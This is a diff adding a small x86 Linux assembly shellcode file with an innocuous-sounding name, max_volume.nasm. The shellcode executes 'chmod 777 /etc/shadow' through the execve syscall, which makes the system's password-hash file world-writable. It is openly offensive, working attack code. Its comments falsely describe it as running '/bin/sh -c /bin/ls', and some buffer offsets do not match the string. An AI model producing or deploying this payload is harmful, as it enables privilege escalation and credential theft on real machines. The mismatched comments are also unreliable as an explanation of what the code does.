@@ -1,0 +1,36 @@
+; Filename: max_volume.nasm
+; Author:  Kwisaba Hamza (@evil_comrade)
+; sulleyfidempa@yahoo.com
+; 1evilcomrade.blogspot.com
+
+global _start
+section .text
+_start:
+
+
+jmp short       callit
+
+doit:   
+
+pop             esi
+xor             eax, eax
+mov byte        [esi + 10], al    ; terminate /bin/sh
+mov byte        [esi + 14], al    ; terminate -c
+mov byte        [esi + 26], al    ; terminate /bin/ls
+mov long        [esi + 28], esi   ; address of /bin/sh in AAAA
+lea             ebx, [esi + 11]    ; get address of -c  
+mov long        [esi + 32], ebx   ; store address of -c in BBBB 
+lea             ebx, [esi + 15]   ; get address of /bin/ls
+mov long        [esi + 36], ebx   ; store address of /bin/ls in CCCC
+mov long        [esi + 40], eax   ; put NULL in DDDD
+mov byte        al, 0x0b          ; prepare the execution, we use syscall 0x0b (execve)
+mov             ebx, esi          ; program 
+lea             ecx, [esi + 28]   ; argument array (/bin/sh -c /bin/ls) 
+lea             edx, [esi + 40]   ; NULL
+int             0x80              ; call the kernel to look at our stuff ;-)
+
+callit:
+call            doit
+
+db              '/bin/chmod#777#/etc/shadow#AAAABBBBCCCCDDDD'
+
